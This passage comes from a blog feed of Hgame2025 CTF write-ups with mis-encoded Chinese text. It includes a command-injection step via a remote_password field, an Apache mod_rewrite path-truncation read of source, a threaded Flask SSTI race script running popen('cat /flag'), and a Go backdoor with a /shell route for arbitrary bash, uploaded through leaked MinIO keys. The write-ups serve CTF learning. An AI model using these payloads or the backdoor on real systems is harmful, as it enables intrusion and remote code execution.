class="hljs-number">136.4001922607422</span>,<br>                                      <span class="hljs-number">136.4001922607422</span>, <span class="hljs-number">136.4001922607422</span>]], dtype=torch.float32)<br><br>    x0 = torch.nn.functional.linear(input_tensor,torch_weight1,torch_bias1)<br>    <span class="hljs-built_in">print</span>(torch.mean(torch_weight1))<br>    <span class="hljs-built_in">print</span>(torch.mean(torch_bias1))<br>    <span class="hljs-built_in">print</span>(torch.mean(x0))<br>    <span class="hljs-built_in">print</span>(x0)<br>    f = torch.allclose(torch.mean(x0), torch.tensor(<span class="hljs-number">0.31415000000000004</span>), rtol=<span class="hljs-number">1.0000000000000001e-05</span>, atol=<span class="hljs-number">0.0001</span>)<br>    <span class="hljs-built_in">print</span>(f)<br>    output = entity(input_tensor)<br>    <span class="hljs-built_in">print</span>(output)<br></code></pre></td></tr></table></figure><p>æœ€åç»ˆäºè·‘å‡ºäº†ç»“æœï¼Œ0.3141 -&gt; 0.3163 åç§»äº† 0.0022</p><p><img src="/img/Hgame2025WP/CeSSbmVXHoGFgSxDTKycNAmDn4c.png"></p><h3 id="Computer-cleaner"><a href="#Computer-cleaner" class="headerlink" title="Computer cleaner"></a>Computer cleaner</h3><p>å¼€è™šæ‹Ÿæœºé‡åˆ°ä¸€ç‚¹é—®é¢˜ï¼Œæˆ‘çš„æ˜¯ 17.0ï¼Œå‡ºé¢˜äººåº”è¯¥æ˜¯ 17.5 åŠä»¥ä¸Šå§ï¼Œæµ…æ”¹ä¸€ä¸‹é…ç½®æ–‡ä»¶ã€‚</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs">æ‰¾åˆ°æ”»å‡»è€…çš„webshellè¿æ¥å¯†ç <br>å¯¹æ”»å‡»è€…è¿›è¡Œç®€å•æº¯æº<br>æ’æŸ¥æ”»å‡»è€…ç›®çš„<br></code></pre></td></tr></table></figure><p>æŒ‰é¢˜ç›®æ‰€ç»™ä¸‰æ­¥æ¥å³å¯å¾—åˆ° flag</p><p><img src="/img/Hgame2025WP/Ie7zbpP1Bo2l74xOOiEckwfznBf.png"></p><p><img src="/img/Hgame2025WP/AKJPbE7N6oJAlyxl640c3STQnNH.png"></p><p><img src="/img/Hgame2025WP/D85YbuUlTotiSmxr4vbc0YgqnZc.png"></p><p><img src="/img/Hgame2025WP/IhUrbfLVQoiedVxtZtAci61Mnpd.png"></p><h1 id="WEEK2"><a href="#WEEK2" class="headerlink" title="WEEK2"></a>WEEK2</h1><h2 id="Web-1"><a href="#Web-1" class="headerlink" title="Web"></a>Web</h2><h3 id="Level-21096-HoneyPot"><a href="#Level-21096-HoneyPot" class="headerlink" title="Level 21096 HoneyPot"></a>Level 21096 HoneyPot</h3><p>ç›®å½•æ‰«æï¼Œå­˜åœ¨ <code>/flag</code>ï¼Œç›´æ¥è®¿é—®ä¸º <code>fake_flag</code></p><p>å®¡è®¡é™„ä»¶æºç  <code>main.go</code>ï¼Œä¸»è¦å®ç°äº†æ•°æ®åº“è¿æ¥æµ‹è¯•ã€å¯¼å…¥ã€æŸ¥è¯¢è¿™å‡ ä¸ªåŠŸèƒ½ï¼Œå‘ç°å­˜åœ¨å‡½æ•° <code>sanitizeInput()</code> å’Œ <code>validateImportConfig()</code> å¯¹å„ç§è¾“å…¥ä¸¥æ ¼è¿‡æ»¤ã€‚</p><p>åœ¨æ³¨é‡Šçš„é™„è¿‘å‘ç°å„ä¸ªå‚æ•°å…ˆæ‹¼æ¥ä¸ºå­—ç¬¦ä¸² commandï¼Œå†ç”¨ <code>cmd := exec.Command(&quot;sh&quot;, &quot;-c&quot;, command)</code> æ‰§è¡Œå‘½ä»¤ï¼Œå…¶ä¸­å‚æ•° <code>config.RemotePassword</code> é—æ¼äº†å¯¹è¾“å…¥çš„è¿‡æ»¤ï¼Œä»è€Œå¯ä»¥å®æ–½å‘½ä»¤æ³¨å…¥ã€‚</p><p>ç‚¹å‡»å¯¼å…¥æ•°æ®ï¼ŒæˆªåŒ…ï¼Œåœ¨ <code>remote_password</code> å­—æ®µå¤„åŠ  <code>;</code> æ¥æˆªæ–­å‰é¢çš„å‘½ä»¤ï¼Œç„¶åæ‰§è¡Œ <code>/writeflag</code></p><p><img src="/img/Hgame2025WP/RXldbCkq0o0DBDxX4sOcmusSnbf.png"></p><p>å†è®¿é—® <code>/flag</code>ï¼Œå¾—åˆ° flag</p><p><img src="/img/Hgame2025WP/H4bcbHBq2o9jYWxf5QhcovWmnIb.png"></p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
      <tag>web</tag>
      
      <tag>misc</tag>
      
      <tag>WriteUp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Hgame2025 éƒ¨åˆ†èµ›é¢˜å¤ç°</title>
    <link href="/2025/03/02/Hgame2025%E9%83%A8%E5%88%86%E8%B5%9B%E9%A2%98%E5%A4%8D%E7%8E%B0/"/>
    <url>/2025/03/02/Hgame2025%E9%83%A8%E5%88%86%E8%B5%9B%E9%A2%98%E5%A4%8D%E7%8E%B0/</url>
    
    <content type="html"><![CDATA[<h1 id="Hgame2025-éƒ¨åˆ†èµ›é¢˜å¤ç°"><a href="#Hgame2025-éƒ¨åˆ†èµ›é¢˜å¤ç°" class="headerlink" title="Hgame2025 éƒ¨åˆ†èµ›é¢˜å¤ç°"></a>Hgame2025 éƒ¨åˆ†èµ›é¢˜å¤ç°</h1><h1 id="Week1"><a href="#Week1" class="headerlink" title="Week1"></a>Week1</h1><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="Level-24-Pacman"><a href="#Level-24-Pacman" class="headerlink" title="Level 24 Pacman"></a>Level 24 Pacman</h3><p>è¿™é“é¢˜åšå‡ºæ¥äº†ï¼Œä½†æ˜¯æœ‰æ›´ç®€å•çš„æ–¹æ³•</p><p>æ¸¸æˆå¤±è´¥ä¸€æ¬¡åå³å¯å¾—åˆ°ä¸€ä¸ªâ€œgiftâ€ï¼Œç»è¿‡ base64+ æ …æ å¯†ç è§£å¯†å¾—åˆ°ä¸€ä¸ªå‡çš„ flag</p><p><img src="/img/Hgame2025%E5%A4%8D%E7%8E%B0/BofvbORQ6oUhCQxTMj9cPzopnTb.png"></p><p>flag æ˜¯åœ¨æ¸¸æˆé€šå…³åç»™å‡ºï¼Œé‚£ä¹ˆå°±å®Œå…¨å¯èƒ½åœ¨ js æºç é‡Œæ‰¾åˆ° flag ç›¸å…³çš„å­—ç¬¦ä¸²ã€‚è¿™é‡Œå¯ä»¥ç»“åˆå…³é”®å­—â€œgiftâ€è¿›è¡Œæœç´¢ï¼Œå‘ç°äº†å¦ä¸€ä¸ªä¸åŒçš„â€œgiftâ€ï¼ŒåŒæ ·çš„æ–¹å¼è§£å¯†å³å¯å¾—åˆ° flag</p><p><img src="/img/Hgame2025%E5%A4%8D%E7%8E%B0/BNAgbjD1To2lnSxWGoecxrJinbh.png"></p><h3 id="Level-38475-è§’è½"><a href="#Level-38475-è§’è½" class="headerlink" title="Level 38475 è§’è½"></a>Level 38475 è§’è½</h3><p>ç”¨ dirsearch ç›®å½•æ‰«æå¯ä»¥å‘ç° robots.txtï¼Œå…¶ä¸­æœ‰æ•æ„Ÿä¿¡æ¯ app.conf</p><p><img src="/img/Hgame2025%E5%A4%8D%E7%8E%B0/MvOVbVXGJoePSpxLGPfcK7PBnsb.png"></p><p><img src="/img/Hgame2025%E5%A4%8D%E7%8E%B0/VMBpb2SYgooQXoxMcPYcBhWgnFc.png"></p><p>ä»ä¸­å¯ä»¥æ‹¿åˆ° app.py çš„ç»å¯¹è·¯å¾„ï¼Œå†åˆ©ç”¨ rewrite æ¥è¯»â½‚ä»¶ï¼Œåšé¢˜æ—¶æœªèƒ½è”æƒ³åˆ°è¿™ä¸€ç‚¹ï¼Œä¹Ÿä¸äº†è§£ CVE-2024-38475ï¼Œåªæ˜¯ç”¨ <code>L1nk/</code> å¼€å¤´çš„ <code>user-agent</code> æ‰«æçˆ†ç ´ï¼Œæ‰€ä»¥æœªèƒ½æ‰¾åˆ°ä»»ä½•æœ‰æ•ˆä¿¡æ¯ã€‚</p><p>ç ”è¯»ä¸€ä¸‹å‚è€ƒèµ„æ–™ï¼š<a href="https://blog.orange.tw/posts/2024-08-confusion-attacks-ch/">https://blog.orange.tw/posts/2024-08-confusion-attacks-ch/</a> å¯çŸ¥ï¼ŒApache çš„ mod_rewrite å…è®¸ç½‘ç«™ç®¡ç†å‘˜é€è¿‡ RewriteRule è¯­æ³•è½»æ¾çš„å°†è·¯å¾„é€è¿‡æŒ‡å®šçš„è§„åˆ™æ”¹å†™ï¼š</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">RewriteRule</span> Pattern Substitution<span class="hljs-meta"> [flags]</span><br></code></pre></td></tr></table></figure><p>å…¶ä¸­ç›®æ ‡å¯ä»¥æ˜¯ä¸€ä¸ªæ¡£æ¡ˆç³»ç»Ÿè·¯å¾„æˆ–æ˜¯ä¸€ä¸ªç½‘å€ï¼Œåœ¨æ”¹å†™è·¯å¾„æ—¶ï¼Œmod_rewrite ä¼šå¼ºåˆ¶æŠŠç»“æœè§†ä¸ºç½‘å€å¤„ç†(splitout_queryargs())ï¼Œè¿™å¯¼è‡´äº†åœ¨ HTTP è¯·æ±‚ä¸­å¯ä»¥é€è¿‡ä¸€ä¸ªé—®å· <code>%3F</code> å»æˆªæ–­ RewriteRule åé¢çš„è·¯å¾„æˆ–ç½‘å€ï¼Œä»è€Œå¼•å‡ºäº†è·¯å¾„æˆªæ–­å’Œè¯¯å¯¼ RewriteFlag çš„è®¾ç½®ä¸¤ç§æ”»å‡»æ–¹å¼ï¼Œæœ¬é¢˜æ¶‰åŠçš„åº”è¯¥æ˜¯å‰è€…ã€‚</p><p>æ‰€ä»¥è®¿é—® <code>/admin/usr/local/apache2/app/app.py%3f</code> å¯ä»¥æˆªæ–­åé¢çš„å†…å®¹è¯»å–åˆ° app.py çš„æºç </p><p><img src="/img/Hgame2025%E5%A4%8D%E7%8E%B0/JOdwb24EQoAMlExvZLbcSI3dnEh.png"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, request, render_template, render_template_string, redirect<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> templates<br><br>app = Flask(__name__)<br>pwd = os.path.dirname(__file__)<br>show_msg = templates.show_msg<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">readmsg</span>():<br>        filename = pwd + <span class="hljs-string">&quot;/tmp/message.txt&quot;</span><br>        <span class="hljs-keyword">if</span> os.path.exists(filename):<br>                f = <span class="hljs-built_in">open</span>(filename, <span class="hljs-string">&#x27;r&#x27;</span>)<br>                message = f.read()<br>                f.close()<br>                <span class="hljs-keyword">return</span> message<br>        <span class="hljs-keyword">else</span>:<br>                <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;No message now.&#x27;</span><br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/index&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():<br>        status = request.args.get(<span class="hljs-string">&#x27;status&#x27;</span>)<br>        <span class="hljs-keyword">if</span> status <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>                status = <span class="hljs-string">&#x27;&#x27;</span><br>        <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&quot;index.html&quot;</span>, status=status)<br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/send&#x27;</span>, methods=[<span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">write_message</span>():<br>        filename = pwd + <span class="hljs-string">&quot;/tmp/message.txt&quot;</span><br>        message = request.form[<span class="hljs-string">&#x27;message&#x27;</span>]<br><br>        f = <span class="hljs-built_in">open</span>(filename, <span class="hljs-string">&#x27;w&#x27;</span>)<br>        f.write(message) <br>        f.close()<br><br>        <span class="hljs-keyword">return</span> redirect(<span class="hljs-string">&#x27;index?status=Send successfully!!&#x27;</span>)<br>        <br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/read&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">read_message</span>():<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;&#123;&quot;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> readmsg():<br>                show = show_msg.replace(<span class="hljs-string">&quot;&#123;&#123;message&#125;&#125;&quot;</span>, readmsg())<br>                <span class="hljs-keyword">return</span> render_template_string(show)<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;waf!!&#x27;</span><br>        <br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>        app.run(host = <span class="hljs-string">&#x27;0.0.0.0&#x27;</span>, port = <span class="hljs-number">5000</span>)<br></code></pre></td></tr></table></figure><p>ä»æºç ä¸­å¯ä»¥å‘ç°ï¼Œç•™è¨€æ¿å‘é€çš„ä¿¡æ¯ä¼šå†™å…¥ <code>/tmp/message.txt</code> ä¸­ï¼Œå­˜åœ¨ <code>/read</code> è·¯ç”±ä¹Ÿå°±æ˜¯ <code>/app/read</code> å¯ä»¥è¯»å–ç•™è¨€æ¿å‘é€çš„ä¿¡æ¯ <code>/tmp/message.txt</code> å¹¶ç›´æ¥æ¸²æŸ“åœ¨æ¨¡ç‰ˆä¸­è¿”å›ï¼Œä½†å‰ææ˜¯ä¸èƒ½åŒ…å« <code>&#123;</code>ï¼Œå¦åˆ™è¿”å› <code>&#39;waf!!&#39;</code>ã€‚é‚£ä¹ˆå¯ä»¥è€ƒè™‘é€šè¿‡ SSTI å®ç° RCEï¼Œé€šè¿‡æ¡ä»¶ç«äº‰æ¥ç»•è¿‡ if åˆ¤æ–­è¯­å¥ã€‚</p><p><img src="/img/Hgame2025%E5%A4%8D%E7%8E%B0/FL8cbf8bsouurhxDsZecOlxjnXb.png"></p><p><img src="/img/Hgame2025%E5%A4%8D%E7%8E%B0/P6WBbbBNdobRqsxSv5BcnszUndh.png"></p><p>å…ˆè‡ªå·±å†™ä¸ªè„šæœ¬è¯•ä¸€ä¸‹ï¼Œå¯¹å†™å…¥å’Œè¯»å–è¿‡ç¨‹è¿›è¡Œæ¡ä»¶ç«äº‰ï¼Œåœ¨å‰ä¸€æ¬¡è¯»å–æ–‡ä»¶æ—  <code>&#123;</code> é€šè¿‡ if åˆ¤æ–­åã€åä¸€æ¬¡è¯»å–æ–‡ä»¶ä¼ å…¥ show æ¸²æŸ“å‰ï¼Œå†™å…¥ç›®æ ‡è¯­å¥ <code>&#123;&#123;config.__class__.__init__.__globals__['os'].popen('cat /flag').read()&#125;&#125;</code>ï¼Œå®ç° RCE</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> threading<br><span class="hljs-keyword">import</span> requests<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">send_</span>():<br>    data=&#123;<span class="hljs-string">&quot;message&quot;</span>: <span class="hljs-string">&quot;&#123;&#123;config.__class__.__init__.__globals__[&#x27;os&#x27;].popen(&#x27;cat /flag&#x27;).read()&#125;&#125;&quot;</span>&#125;<br>    res=requests.post(<span class="hljs-string">&quot;http://node1.hgame.vidar.club:30668/app/send&quot;</span>,data=data)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">read_</span>():<br>    res=requests.get(<span class="hljs-string">&quot;http://node1.hgame.vidar.club:30668/app/read&quot;</span>)<br>    <span class="hljs-built_in">print</span>(res.text)<br>threads=[]<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">15</span>):<br>    thread1=threading.Thread(target=send_)<br>    thread2=threading.Thread(target=read_)<br>    <span class="hljs-comment">#è¿™é‡Œå½“æ—¶é‡åˆ°äº†ä¸€ä¸ªé—®é¢˜ï¼Œæˆ‘å†™çš„æ˜¯target=send_()é‚£ä¹ˆå®é™…ä¸ºç«‹å³æ‰§è¡Œï¼Œä¸¤ä¸ªå‡½æ•°ä¸ºé¡ºåºæ‰§è¡Œï¼Œæ— æ³•å®ç°æ¡ä»¶ç«äº‰</span><br>    <span class="hljs-comment">#æ­£ç¡®çš„åº”è¯¥æ˜¯target=send_ï¼Œå¤šçº¿ç¨‹å®Œæˆè¯·æ±‚</span><br>    threads.append(thread1)<br>    threads.append(thread2)<br>    thread1.start()<br>    thread2.start()<br><span class="hljs-keyword">for</span> t <span class="hljs-keyword">in</span> threads:<br>    t.join()<br></code></pre></td></tr></table></figure><p><img src="/img/Hgame2025%E5%A4%8D%E7%8E%B0/ACwSbqbhdoseXcxAGdTc8fsOnyh.png"></p><p>å®˜æ–¹ WP æ‰€ç»™è„šæœ¬</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests <br><span class="hljs-keyword">import</span> threading <br>url = <span class="hljs-string">&#x27;http://node1.hgame.vidar.club:32737/&#x27;</span> <br>data = &#123; <br>    <span class="hljs-string">&quot;messgae&quot;</span>: <span class="hljs-string">&quot;&quot;</span>, <br>    &#125; <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">write_msg</span>(<span class="hljs-params">i</span>): <br>    data[<span class="hljs-string">&quot;message&quot;</span>] = <span class="hljs-string">&quot;&#123;&#123;config.__class__.__init__.__globals__[&#x27;os&#x27;].popen(&#x27;cat /flag&#x27;).read()&#125;&#125;&quot;</span>+<span class="hljs-built_in">str</span>(i) <br>    r = requests.post(url + <span class="hljs-string">&#x27;/app/send&#x27;</span>, data=data) <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">read_msg</span>(<span class="hljs-params">i</span>): <br>    r = requests.get(url + <span class="hljs-string">&#x27;/app/read&#x27;</span>) <br>    <span class="hljs-built_in">print</span>(i, <span class="hljs-string">&quot;read&quot;</span>, r.text) <br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;Latest&quot;</span> <span class="hljs-keyword">in</span> r.text: <br>        <span class="hljs-built_in">print</span>(r.text) <br>        exit() <br>threads = [] <br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">10</span>): <br>    thread = threading.Thread(target=write_msg, args=(i,)) <br>    threads.append(thread) <br>    thread.start() <br>    thread = threading.Thread(target=read_msg, args=(i,)) <br>    threads.append(thread) <br>    thread.start() <br><span class="hljs-keyword">for</span> thread <span class="hljs-keyword">in</span> threads: <br>    thread.join()<br></code></pre></td></tr></table></figure><h3 id="Level-25-åŒé¢äººæ´¾å¯¹"><a href="#Level-25-åŒé¢äººæ´¾å¯¹" class="headerlink" title="Level 25 åŒé¢äººæ´¾å¯¹"></a>Level 25 åŒé¢äººæ´¾å¯¹</h3><p>æ¯”èµ›çš„æ—¶å€™ä¸ç†Ÿæ‚‰ IDA ä¸”æœªåŠæ—¶è´­ä¹°ç¬¬äºŒä¸ªæç¤ºï¼Œä¸”æœ«å°¾å¿ƒæ€æœ‰äº›æ€¥ï¼ŒæˆåŠŸè„±å£³åæ²¡æ‰¾åˆ°é…ç½®çš„å†…å®¹ï¼Œå¯¼è‡´å³ä¾¿çŸ¥é“äº†åç»­çš„è§£é¢˜æ€è·¯ä¹Ÿæ— ä»ä¸‹æ‰‹ <a href="https://baimeow.cn/posts/ctf/d3go/">https://baimeow.cn/posts/ctf/d3go/</a>ã€‚é‡æ–°æ£€ç´¢äº†ä¸€ä¸‹ IDA ç›¸å…³ç”¨æ³•ï¼Œé€šè¿‡æŸ¥æ‰¾æ‰€æœ‰å­—ç¬¦ä¸²æ‰¾åˆ°äº†è¿™æ®µé…ç½®</p><p><img src="/img/Hgame2025%E5%A4%8D%E7%8E%B0/FMFHbGvd5oHP6QxfeMRcFt6Sn1g.png"></p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs go">minio: <br>    endpoint: <span class="hljs-string">&quot;127.0.0.1:9000&quot;</span> <br>    access_key: <span class="hljs-string">&quot;minio_admin&quot;</span> <br>    secret_key: <span class="hljs-string">&quot;JPSQ4NOBvh2/W7hzdLyRYLDm0wNRMG48BL09yOKGpHs=&quot;</span> <br>    bucket: <span class="hljs-string">&quot;prodbucket&quot;</span> <br>    key: <span class="hljs-string">&quot;update&quot;</span><br></code></pre></td></tr></table></figure><p>ä½¿ç”¨ minio client è¿æ¥é¶æœºï¼ˆé¢˜ç›®ç»™çš„ç¬¬ä¸€ä¸ªåœ°å€ï¼‰è·å–æºç  src.zip</p><p><img src="/img/Hgame2025%E5%A4%8D%E7%8E%B0/HXSJb1TA3oJYHOxAERdcNhQDn7c.png"></p><p>main.go æºç </p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> (<br>    <span class="hljs-string">&quot;level25/fetch&quot;</span><br><br>    <span class="hljs-string">&quot;level25/conf&quot;</span><br><br>    <span class="hljs-string">&quot;github.com/gin-gonic/gin&quot;</span><br>    <span class="hljs-string">&quot;github.com/jpillora/overseer&quot;</span><br>)<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>    fetcher := &amp;fetch.MinioFetcher&#123;<br>        Bucket:    conf.MinioBucket,<br>        Key:       conf.MinioKey,<br>        Endpoint:  conf.MinioEndpoint,<br>        AccessKey: conf.MinioAccessKey,<br>        SecretKey: conf.MinioSecretKey,<br>    &#125;<br>    overseer.Run(overseer.Config&#123;<br>        Program: program,<br>        Fetcher: fetcher,<br>    &#125;)<br><br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">program</span><span class="hljs-params">(state overseer.State)</span></span> &#123;<br>    g := gin.Default()<br>    g.StaticFS(<span class="hljs-string">&quot;/&quot;</span>, gin.Dir(<span class="hljs-string">&quot;.&quot;</span>, <span class="hljs-literal">true</span>))<br>    g.Run(<span class="hljs-string">&quot;:8080&quot;</span>)<br>&#125;<br></code></pre></td></tr></table></figure><p>ä»æºç å’Œ<a href="https://baimeow.cn/posts/ctf/d3go/">æç¤º</a>ç»“åˆå¯¹ overseer çš„æœç´¢å¯ä»¥å‘ç°ä½¿ç”¨äº† overseer å¯¹ç¨‹åºçƒ­åŠ è½½ï¼Œæ–‡ä»¶å˜æ›´åä¼šè‡ªåŠ¨é‡å¯æ›´æ–°ï¼Œè§£é¢˜æ€è·¯ä¹Ÿå°±æ˜¯ä»è‡ªæ›´æ–°å…¥æ‰‹æ‰“ RCEã€‚</p><p>é‚£ä¹ˆå…ˆåœ¨æœ¬åœ°ä¿®æ”¹ main.go æ–‡ä»¶ï¼Œæ³¨é‡Šæ‰åŸæœ‰çš„é™æ€â½‚ä»¶æ‰˜ç®¡ï¼Œå†™å…¥ WP æ‰€ç»™åé—¨</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">program</span><span class="hljs-params">(state overseer.State)</span></span> &#123;<br>        g := gin.Default()<br>        <span class="hljs-comment">// g.StaticFS(&quot;/&quot;, gin.Dir(&quot;.&quot;, true))</span><br>        g.GET(<span class="hljs-string">&quot;/shell&quot;</span>, <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(c *gin.Context)</span></span> &#123;<br>                cmd, _ := c.GetQuery(<span class="hljs-string">&quot;cmd&quot;</span>)<br>                out, err := exec.Command(<span class="hljs-string">&quot;bash&quot;</span>, <span class="hljs-string">&quot;-c&quot;</span>, cmd).CombinedOutput()<br>                <span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>                        c.String(<span class="hljs-number">500</span>, err.Error())<br>                        <span class="hljs-keyword">return</span><br>                &#125;<br>                c.String(<span class="hljs-number">200</span>, <span class="hljs-type">string</span>(out))<br>        &#125;)<br>        g.Run(<span class="hljs-string">&quot;:8080&quot;</span>)<br>&#125;<br></code></pre></td></tr></table></figure><p>ç„¶åä½¿ç”¨ <code>go build -o update</code> ç¼–è¯‘æ–‡ä»¶ä¸º updateï¼ˆæºæ–‡ä»¶åï¼‰</p><p>å†ä¸Šä¼ è¦†ç›–åŸæ–‡ä»¶ <code>mc cp ./update ctf-minio/prodbucket/update</code></p><p><img src="/img/Hgame2025%E5%A4%8D%E7%8E%B0/QpU4boPRwoAChXxDxCKcqBfende.png"></p><p>ç­‰è‡ªæ›´æ–°å®Œæˆåå‘é¶æœºå‘é€ get è¯·æ±‚ RCEï¼Œå¾—åˆ° flagï¼ˆé¢˜ç›®ç»™çš„ç¬¬äºŒä¸ªåœ°å€ï¼‰</p><p><img src="/img/Hgame2025%E5%A4%8D%E7%8E%B0/Nf5Ub89nuodHNuxfPQ8cwEpdnEh.png"></p><p>å‚è€ƒï¼š<a href="https://infernity.top/2025/02/03/Hgame-2025-week1/#Level-25-%E5%8F%8C%E9%9D%A2%E4%BA%BA%E6%B4%BE%E5%AF%B9">https://infernity.top/2025/02/03/Hgame-2025-week1/#Level-25-%E5%8F%8C%E9%9D%A2%E4%BA%BA%E6%B4%BE%E5%AF%B9</a></p><h1 id="Week2"><a href="#Week2" class="headerlink" title="Week2"></a>Week2</h1><h2 id="Web-1"><a href="#Web-1" class="headerlink" title="Web"></a>Web</h2><h3 id="Level-21096-HoneyPot-Revenge"><a href="#Level-21096-HoneyPot-Revenge" class="headerlink" title="Level 21096 HoneyPot_Revenge"></a>Level 21096 HoneyPot_Revenge</h3><p>æ¯”èµ›æ—¶é’ˆå¯¹ mysqldump å°è¯•ç”¨ç½‘ä¸Šæ‰¾åˆ°çš„ mysql åè®®ä¼ªé€ ç¨‹åºè§£é¢˜ï¼Œä½†æœªèƒ½æˆåŠŸï¼Œä¹Ÿæ²¡æœ‰å…³æ³¨åˆ° CVE-2024-21096 